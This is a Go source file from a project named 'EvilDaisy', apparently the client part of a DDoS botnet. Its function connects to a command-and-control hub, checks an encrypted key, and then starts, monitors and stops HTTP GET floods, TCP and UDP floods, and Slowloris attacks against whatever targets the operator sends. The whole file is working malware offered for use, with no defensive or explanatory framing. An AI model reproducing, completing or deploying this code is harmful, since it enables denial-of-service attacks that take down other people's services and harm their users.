package Network

import (
	"bufio"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"EvilDaisy/Configs"
	"EvilDaisy/DDoS"
	"EvilDaisy/Security"
)

// DDoSGET ...
var DDoSGET []*DDoS.GETDDoS

// TCPFlood ...
var TCPFlood []*DDoS.TCPFlood

// UDPFlood ...
var UDPFlood []*DDoS.UDPFlood

// Slowloris ...
var Slowloris []*DDoS.Slowloris

// ConnectTheHub ...
func ConnectTheHub() {
	for {
	tryConnect:
		if conn, err := net.Dial(string(Configs.Network), string(Configs.Address)); err == nil {
			if valid, err := bufio.NewReader(conn).ReadString('\n'); err == nil {
				if strings.Compare(string(Security.Decrypt(valid, []byte(Configs.SecurityKey))), Configs.SecurityKey) == 0 {
					for {
						if message, err := bufio.NewReader(conn).ReadString('\n'); err == nil {
							decryptMsg := Security.Decrypt(message, []byte(Configs.SecurityKey))
							saltMsg := strings.Split(string(decryptMsg), " ")
							switch saltMsg[0] {
							case string(Configs.GET):
								go func() {
									if workerInt, err := strconv.Atoi(saltMsg[2]); err == nil {
										queueID := len(DDoSGET) + 1
										if GETDDoS, err := DDoS.NewGetDDoS(saltMsg[1], workerInt, queueID); err == nil {
											DDoSGET = append(DDoSGET, GETDDoS)
											fmt.Fprintf(conn, "HTTP Get Attack Started: "+GETDDoS.URL+" Attack ID: "+string(queueID)+"\n")
											GETDDoS.Run()
										} else {
											fmt.Fprintf(conn, err.Error()+"\n")
										}
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.GETStatus):
								go func() {
									if queueID, err := strconv.Atoi(saltMsg[1]); err == nil {
										for _, g := range DDoSGET {
											if g.ID == queueID {
												fmt.Fprintf(conn, "Total Request: "+strconv.Itoa(int(g.TotalRequest))+" Success Request: "+strconv.Itoa(int(g.SuccessRequest))+"\n")
											}
										}
										fmt.Fprintf(conn, "ID not found"+"\n")
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.GETStop):
								go func() {
									if queueID, err := strconv.Atoi(saltMsg[1]); err == nil {
										for _, g := range DDoSGET {
											if g.ID == queueID {
												g.Stop()
												fmt.Fprintf(conn, "HTTP Get Attack Stoped. Attack ID: "+string(queueID)+"\n")
											}
										}
										fmt.Fprintf(conn, "ID not found"+"\n")
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.TCP):
								go func() {
									if workerInt, err := strconv.Atoi(saltMsg[2]); err == nil {
										queueID := len(TCPFlood) + 1
										if floodTCP, err := DDoS.NewTCPFlood(saltMsg[1], workerInt, queueID); err == nil {
											TCPFlood = append(TCPFlood, floodTCP)
											fmt.Fprintf(conn, "TCP Flood Attack Started: "+floodTCP.Target+" Attack ID: "+string(queueID)+"\n")
											floodTCP.Run()
										} else {
											fmt.Fprintf(conn, err.Error()+"\n")
										}
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.TCPStatus):
								go func() {
									if queueID, err := strconv.Atoi(saltMsg[1]); err == nil {
										for _, t := range TCPFlood {
											if t.ID == queueID {
												fmt.Fprintf(conn, "Total TCP Packets: "+strconv.Itoa(int(t.TotalPacket))+" Success TCP Packet: "+strconv.Itoa(int(t.SuccessPacket))+"\n")
											}
										}
										fmt.Fprintf(conn, "ID not found"+"\n")
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.TCPStop):
								go func() {
									if queueID, err := strconv.Atoi(saltMsg[1]); err == nil {
										for _, t := range TCPFlood {
											if t.ID == queueID {
												t.Stop()
												fmt.Fprintf(conn, "TCP Flood Attack Stoped. Attack ID: "+string(queueID)+"\n")
											}
										}
										fmt.Fprintf(conn, "ID not found"+"\n")
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.UDP):
								go func() {
									if workerInt, err := strconv.Atoi(saltMsg[2]); err == nil {
										queueID := len(UDPFlood) + 1
										if floodUDP, err := DDoS.NewUDPFlood(saltMsg[1], workerInt, queueID); err == nil {
											UDPFlood = append(UDPFlood, floodUDP)
											fmt.Fprintf(conn, "UDP Flood Attack Started: "+floodUDP.Target+" Attack ID: "+string(queueID)+"\n")
											floodUDP.Run()
										} else {
											fmt.Fprintf(conn, err.Error()+"\n")
										}
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.UDPStatus):
								go func() {
									if queueID, err := strconv.Atoi(saltMsg[1]); err == nil {
										for _, u := range UDPFlood {
											if u.ID == queueID {
												fmt.Fprintf(conn, "Total UDP Packets: "+strconv.Itoa(int(u.TotalPacket))+" Success UDP Packet: "+strconv.Itoa(int(u.SuccessPacket))+"\n")
											}
										}
										fmt.Fprintf(conn, "ID not found"+"\n")
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.UDPStop):
								go func() {
									if queueID, err := strconv.Atoi(saltMsg[1]); err == nil {
										for _, u := range UDPFlood {
											if u.ID == queueID {
												u.Stop()
												fmt.Fprintf(conn, "UDP Flood Attack Stoped. Attack ID: "+string(queueID)+"\n")
											}
										}
										fmt.Fprintf(conn, "ID not found"+"\n")
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.Slowloris):
								go func() {
									if workerInt, err := strconv.Atoi(saltMsg[2]); err == nil {
										queueID := len(Slowloris) + 1
										if slowloris, err := DDoS.NewSlowloris(saltMsg[1], workerInt, queueID); err == nil {
											Slowloris = append(Slowloris, slowloris)
											fmt.Fprintf(conn, "Slowloris Attack Started: "+slowloris.Target+" Attack ID: "+string(queueID)+"\n")
											slowloris.Run()
										} else {
											fmt.Fprintf(conn, err.Error()+"\n")
										}
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.SlowlorisStatus):
								go func() {
									if queueID, err := strconv.Atoi(saltMsg[1]); err == nil {
										for _, s := range Slowloris {
											if s.ID == queueID {
												fmt.Fprintf(conn, "Total Request: "+strconv.Itoa(int(s.TotalRequest))+" Success Request: "+strconv.Itoa(int(s.SuccessRequest))+"\n")
											}
										}
										fmt.Fprintf(conn, "ID not found"+"\n")
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							case string(Configs.SlowlorisStop):
								go func() {
									if queueID, err := strconv.Atoi(saltMsg[1]); err == nil {
										for _, s := range Slowloris {
											if s.ID == queueID {
												s.Stop()
												fmt.Fprintf(conn, "Slowloris Attack Stoped. Attack ID: "+string(queueID)+"\n")
											}
										}
										fmt.Fprintf(conn, "ID not found"+"\n")
									} else {
										fmt.Fprintf(conn, err.Error()+"\n")
									}
								}()
							}
						} else {
							if Configs.IsDebug {
								fmt.Println(err.Error())
							}
						}
					}
				} else {
					if Configs.IsDebug {
						fmt.Println(string(Configs.InvalidServer))
					}
					conn.Close()
					time.Sleep(time.Second * 10)
					goto tryConnect
				}
			} else {
				if Configs.IsDebug {
					fmt.Println(err)
				}
			}
		} else {
			if Configs.IsDebug {
				fmt.Println(err.Error())
			}
			time.Sleep(time.Second * 5)
		}
	}
}
